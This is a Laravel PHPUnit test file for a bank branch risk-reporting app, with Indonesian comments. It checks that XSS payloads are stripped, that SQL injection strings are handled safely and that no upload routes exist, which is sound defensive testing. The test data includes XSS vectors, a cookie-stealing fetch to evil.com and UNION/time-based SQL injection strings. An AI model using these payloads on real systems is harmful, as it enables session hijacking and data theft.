<?php

namespace Tests\Feature;

use App\Models\User;
use App\Models\Branch;
use App\Models\RiskItem;
use App\Models\RiskCause;
use App\Models\RiskMitigation;
use App\Models\RiskReport;
use Spatie\Permission\Models\Role;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;
use PHPUnit\Framework\Attributes\Test;

/**
 * Phase 4 Security Tests — Input Validation & Output Sanitization
 * 
 * Pengujian ini dilakukan layaknya penetration tester profesional untuk
 * memvalidasi implementasi keamanan Phase 4:
 * - 4.1 Form Request Validation
 * - 4.2 XSS Prevention
 * - 4.3 SQL Injection Prevention
 * - 4.4 File Upload (tidak ada)
 */
class Phase4SecurityTest extends TestCase
{
    use RefreshDatabase;

    private User $teller;
    private User $kacab;
    private User $manrisk;
    private Branch $branch;
    private RiskItem $riskItem;
    private RiskCause $cause;
    private RiskMitigation $mitigation;

    protected function setUp(): void
    {
        parent::setUp();

        $roleMapping = [
            'teller' => 'maker', 'kacab' => 'checker', 'manrisk' => 'admin',
        ];
        foreach ($roleMapping as $name => $category) {
            Role::firstOrCreate(['name' => $name], ['role_category' => $category]);
        }

        $this->branch = Branch::factory()->create([
            'nama_cabang' => 'Cabang A',
            'kode_cabang' => 'CBA',
            'is_active' => true,
        ]);

        $this->teller = User::factory()->create(['branch_id' => $this->branch->id]);
        $this->teller->assignRole('teller');

        $this->kacab = User::factory()->create(['branch_id' => $this->branch->id]);
        $this->kacab->assignRole('kacab');

        $this->manrisk = User::factory()->create(['branch_id' => $this->branch->id]);
        $this->manrisk->assignRole('manrisk');

        $this->riskItem = RiskItem::factory()->create([
            'nama_risiko' => 'Test Risiko',
            'kategori' => 'finansial',
            'role_target' => 'teller',
            'sumber_risiko' => 'manusia',
        ]);

        $this->cause = RiskCause::factory()->create([
            'risk_item_id' => $this->riskItem->id,
            'penyebab' => 'Test Penyebab',
        ]);

        $this->mitigation = RiskMitigation::factory()->create([
            'risk_cause_id' => $this->cause->id,
            'mitigasi' => 'Test Mitigasi',
        ]);
    }

    // ========================================================================
    // 4.1 FORM REQUEST VALIDATION — UpdateRiskApprovalStatusRequest
    // ========================================================================

    #[Test]
    public function xss_in_alasan_reject_is_stripped()
    {
        $report = $this->createPendingReport();
        
        $this->actingAs($this->kacab);
        $response = $this->post(route('risk_reports.update_status', $report->id), [
            'status' => 'need_revision',
            'alasan_reject' => '<script>alert("xss")</script>Ini alasan reject',
        ]);

        $response->assertSessionHas('success');

        $report->refresh();
        $this->assertStringNotContainsString('<script>', $report->revision_note);
        $this->assertStringContainsString('alert("xss")', $report->revision_note);
        $this->assertStringContainsString('Ini alasan reject', $report->revision_note);
    }

    #[Test]
    public function xss_in_alasan_revisi_is_stripped()
    {
        $report = $this->createApprovedReport();

        $this->actingAs($this->manrisk);
        $response = $this->post(route('risk_reports.request_revision', $report->id), [
            'revision_note' => '<img src=x onerror=alert(1)>Perlu revisi bagian kronologis',
        ]);

        $response->assertSessionHas('success');

        $report->refresh();
        $this->assertStringNotContainsString('<img', $report->revision_note);
        $this->assertStringNotContainsString('onerror=alert(1)', $report->revision_note);
        $this->assertStringContainsString('Perlu revisi bagian kronologis', $report->revision_note);
    }

    #[Test]
    public function alasan_revisi_minimum_10_characters()
    {
        $report = $this->createApprovedReport();

        $this->actingAs($this->manrisk);
        $response = $this->post(route('risk_reports.request_revision', $report->id), [
            'revision_note' => 'abcde',
        ]);

        $response->assertSessionHasErrors('revision_note');
    }

    #[Test]
    public function alasan_reject_minimum_10_characters()
    {
        $report = $this->createPendingReport();

        $this->actingAs($this->kacab);
        $response = $this->post(route('risk_reports.update_status', $report->id), [
            'status' => 'need_revision',
            'alasan_reject' => 'abcde',
        ]);

        $response->assertSessionHasErrors('alasan_reject');
    }

    #[Test]
    public function alasan_reject_maximum_2000_characters()
    {
        $report = $this->createPendingReport();

        $this->actingAs($this->kacab);
        $response = $this->post(route('risk_reports.update_status', $report->id), [
            'status' => 'need_revision',
            'alasan_reject' => str_repeat('A', 2500),
        ]);

        $response->assertSessionHasErrors('alasan_reject');
    }

    #[Test]
    public function alasan_revisi_maximum_2000_characters()
    {
        $report = $this->createApprovedReport();

        $this->actingAs($this->manrisk);
        $response = $this->post(route('risk_reports.request_revision', $report->id), [
            'revision_note' => str_repeat('A', 2500),
        ]);

        $response->assertSessionHasErrors('revision_note');
    }

    #[Test]
    public function double_encoded_xss_in_alasan_reject_is_handled()
    {
        $report = $this->createPendingReport();

        $this->actingAs($this->kacab);
        
        // Double encoded: user kirim teks dengan karakter < > (HTML entities)
        // strip_tags() akan membiarkannya karena bukan tag HTML yang valid
        // Tapi saat di-render di Blade dengan {{ }}, akan di-escape jadi &lt;script&gt;
        // Jadi double-safe — tidak akan dieksekusi sebagai script
        $response = $this->post(route('risk_reports.update_status', $report->id), [
            'status' => 'need_revision',
            'alasan_reject' => 'Ini alasan reject dengan karakter < dan >',
        ]);

        $response->assertSessionHas('success');

        $report->refresh();
        // strip_tags() hanya menghapus tag HTML, bukan karakter < dan > biasa
        $this->assertStringContainsString('Ini alasan reject dengan karakter < dan >', $report->revision_note);
    }

    // ========================================================================
    // 4.2 XSS PREVENTION — StoreRiskReportRequest (6 field teks)
    // ========================================================================

    #[Test]
    public function xss_in_kronologis_kejadian_is_stripped()
    {
        $this->actingAs($this->teller);
        
        $response = $this->post(route('form.risiko.store'), $this->validReportData([
            'kronologis_kejadian' => '<script>alert("xss")</script>Kronologis kejadian yang panjang dan detail minimal dua puluh kata untuk memenuhi validasi min words yang sudah ditentukan oleh sistem.',
        ]));

        $response->assertSessionHas('success');

        $report = RiskReport::where('user_id', $this->teller->id)->first();
        $this->assertStringNotContainsString('<script>', $report->kronologis_kejadian);
        $this->assertStringContainsString('alert("xss")', $report->kronologis_kejadian);
    }

    #[Test]
    public function xss_in_mitigasi_tambahan_is_stripped()
    {
        $this->actingAs($this->teller);
        
        $response = $this->post(route('form.risiko.store'), $this->validReportData([
            'mitigasi_tambahan' => '<iframe src="https://evil.com"></iframe>Mitigasi tambahan',
        ]));

        $response->assertSessionHas('success');

        $report = RiskReport::where('user_id', $this->teller->id)->first();
        $this->assertStringNotContainsString('<iframe', $report->mitigasi_tambahan);
        $this->assertStringContainsString('Mitigasi tambahan', $report->mitigasi_tambahan);
    }

    #[Test]
    public function xss_in_tindakan_awal_is_stripped()
    {
        $this->actingAs($this->teller);
        
        $response = $this->post(route('form.risiko.store'), $this->validReportData([
            'tindakan_awal' => '<img src=x onerror=alert(1)>Tindakan awal dilakukan',
        ]));

        $response->assertSessionHas('success');

        // tindakan_awal disimpan di log, bukan di kolom report
        $report = RiskReport::where('user_id', $this->teller->id)->first();
        $log = $report->logs()->where('note', 'like', '%penanganan awal :%')->first();
        
        $this->assertNotNull($log);
        // strip_tags() di StoreRiskReportRequest sudah strip <img> dan atributnya
        $this->assertStringNotContainsString('<img', $log->note);
        $this->assertStringNotContainsString('onerror=alert(1)', $log->note);
        $this->assertStringContainsString('Tindakan awal dilakukan', $log->note);
    }

    #[Test]
    public function xss_in_other_item_description_is_stripped()
    {
        $this->actingAs($this->teller);
        
        $response = $this->post(route('form.risiko.store'), $this->validReportData([
            'other_item_description' => '<a href="javascript:alert(1)">Klik disini</a>',
        ]));

        $response->assertSessionHas('success');

        $report = RiskReport::where('user_id', $this->teller->id)->first();
        $this->assertStringNotContainsString('<a', $report->other_item_description);
        $this->assertStringContainsString('Klik disini', $report->other_item_description);
    }

    #[Test]
    public function xss_in_other_cause_description_is_stripped()
    {
        $this->actingAs($this->teller);
        
        $response = $this->post(route('form.risiko.store'), $this->validReportData([
            'risk_cause_id' => null,
            'other_cause_description' => '<svg onload=alert(1)>Penyebab lainnya</svg>',
        ]));

        $response->assertSessionHas('success');

        $report = RiskReport::where('user_id', $this->teller->id)->first();
        $this->assertStringNotContainsString('<svg', $report->other_cause_description);
        $this->assertStringContainsString('Penyebab lainnya', $report->other_cause_description);
    }

    #[Test]
    public function xss_in_dampak_non_finansial_is_stripped()
    {
        $this->actingAs($this->teller);
        
        $response = $this->post(route('form.risiko.store'), $this->validReportData([
            'kategori' => 'non-finansial',
            'skala_dampak' => 'sedang',
            'dampak_non_finansial' => '<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>Dampak non finansial signifikan',
        ]));

        $response->assertSessionHas('success');

        $report = RiskReport::where('user_id', $this->teller->id)->first();
        $this->assertStringNotContainsString('<script>', $report->dampak_non_finansial);
        $this->assertStringContainsString('Dampak non finansial signifikan', $report->dampak_non_finansial);
    }

    #[Test]
    public function multiple_xss_payloads_in_single_field_are_all_stripped()
    {
        $this->actingAs($this->teller);
        
        $payload = '<script>alert(1)</script><img src=x onerror=alert(2)><svg onload=alert(3)>Kronologis kejadian yang panjang dan detail minimal dua puluh kata untuk memenuhi validasi min words yang sudah ditentukan oleh sistem.';
        
        $response = $this->post(route('form.risiko.store'), $this->validReportData([
            'kronologis_kejadian' => $payload,
        ]));

        $response->assertSessionHas('success');

        $report = RiskReport::where('user_id', $this->teller->id)->first();
        $this->assertStringNotContainsString('<script>', $report->kronologis_kejadian);
        $this->assertStringNotContainsString('<img', $report->kronologis_kejadian);
        $this->assertStringNotContainsString('<svg', $report->kronologis_kejadian);
        $this->assertStringContainsString('alert(1)', $report->kronologis_kejadian);
        $this->assertStringContainsString('Kronologis kejadian', $report->kronologis_kejadian);
    }

    // ========================================================================
    // 4.3 SQL INJECTION PREVENTION
    // ========================================================================

    #[Test]
    public function sql_injection_in_search_field_is_safe()
    {
        $this->actingAs($this->teller);
        
        $response = $this->get(route('risk.history', [
            'search' => "' OR '1'='1",
        ]));

        $response->assertStatus(200);
    }

    #[Test]
    public function sql_injection_union_based_is_safe()
    {
        $this->actingAs($this->manrisk);
        
        $response = $this->get(route('risk.history', [
            'search' => "1 UNION SELECT * FROM users",
        ]));

        $response->assertStatus(200);
    }

    #[Test]
    public function sql_injection_in_date_filter_is_safe()
    {
        $this->actingAs($this->teller);
        
        $response = $this->get(route('risk.history', [
            'start_date' => "2024-01-01' OR '1'='1",
            'end_date' => "2024-12-31' OR '1'='1",
        ]));

        $response->assertStatus(200);
    }

    #[Test]
    public function sql_injection_in_branch_filter_is_safe()
    {
        $this->actingAs($this->manrisk);
        
        $response = $this->get(route('risk.history', [
            'branch_id' => "1 UNION SELECT * FROM users",
        ]));

        $response->assertStatus(200);
    }

    #[Test]
    public function sql_injection_time_based_is_safe()
    {
        $this->actingAs($this->teller);
        
        $response = $this->get(route('risk.history', [
            'search' => "1' AND SLEEP(5) AND '1'='1",
        ]));

        $response->assertStatus(200);
    }

    // ========================================================================
    // 4.4 FILE UPLOAD — Tidak ada fitur upload
    // ========================================================================

    #[Test]
    public function no_file_upload_endpoint_exists()
    {
        $routes = collect(\Route::getRoutes()->getRoutes());
        
        $uploadRoutes = $routes->filter(function ($route) {
            $uri = $route->uri();
            return preg_match('/\bupload\b|\bgambar\b|\blampiran\b|\battachment\b/i', $uri);
        });

        $this->assertCount(0, $uploadRoutes, 'Ditemukan route upload yang tidak seharusnya ada: ' . $uploadRoutes->pluck('uri')->implode(', '));
    }

    // ========================================================================
    // HELPERS
    // ========================================================================

    private function createPendingReport(): RiskReport
    {
        return RiskReport::factory()->create([
            'user_id' => $this->teller->id,
            'branch_id' => $this->branch->id,
            'risk_item_id' => $this->riskItem->id,
            'risk_cause_id' => $this->cause->id,
            'kategori' => 'finansial',
            'status' => 'pending_atasan',
            'kode_laporan' => 'RISK-CBATL-202605-0001',
        ]);
    }

    private function createApprovedReport(): RiskReport
    {
        return RiskReport::factory()->create([
            'user_id' => $this->teller->id,
            'branch_id' => $this->branch->id,
            'risk_item_id' => $this->riskItem->id,
            'risk_cause_id' => $this->cause->id,
            'kategori' => 'finansial',
            'status' => 'approved',
            'kode_laporan' => 'RISK-CBATL-202605-0002',
        ]);
    }

    private function validReportData(array $overrides = []): array
    {
        return array_merge([
            'kategori' => 'finansial',
            'tanggal_kejadian' => now()->subDays(1)->format('Y-m-d'),
            'tanggal_diketahui' => now()->format('Y-m-d'),
            'risk_item_id' => $this->riskItem->id,
            'risk_cause_id' => $this->cause->id,
            'kronologis_kejadian' => 'Kronologis kejadian yang panjang dan detail minimal dua puluh kata untuk memenuhi validasi min words yang sudah ditentukan oleh sistem.',
            'dampak_finansial' => 1000000,
        ], $overrides);
    }
}
